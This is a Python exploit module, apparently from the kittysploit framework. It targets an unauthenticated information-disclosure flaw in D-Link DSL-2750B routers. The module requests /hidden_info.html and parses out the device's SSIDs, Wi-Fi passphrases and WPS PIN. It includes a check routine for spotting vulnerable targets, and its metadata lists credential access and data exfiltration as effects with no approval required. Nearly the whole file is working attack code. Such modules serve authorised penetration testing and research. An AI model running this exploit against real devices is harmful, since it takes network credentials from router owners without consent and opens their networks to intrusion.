#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DSL-2750B Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DSL-2750B Info Disclosure',
        'description': 'Module explois information disclosure vulnerability in D-Link DSL-2750B devices. It is possible to retrieve sensitive information such as SSID, Wi-Fi password, PIN code.',
        'author': ['Alvaro Folgado', 'Jose Rodriguez', 'Ivan Sanz', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://seclists.org/fulldisclosure/2015/May/129'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/hidden_info.html"
        )
        if response is None:
            return

        creds = []
        data = ['2.4G SSID', '2.4G PassPhrase', '5G SSID', '5G PassPhrase', 'PIN Code']

        for d in data:
            regexp = "<td nowrap><B>{}:</B></td>\r\n\t\t\t<td>(.+?)</td>".format(d)
            val = re.findall(regexp, response.text)

            if len(val):
                creds.append((d, val[0]))

        if len(creds):
            print_success("Credentials found!")
            headers = ("Option", "Value")
            print_table(headers, *creds)
        else:
            print_error("Exploit failed - credentials could not be found")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/hidden_info.html"
        )
        if response is None:
            return False  # target is not vulnerable

        if all(map(lambda x: x in response.text, ["SSID", "PassPhrase"])):
            return True  # target is vulnerable

        return False  # target is not vulnerable
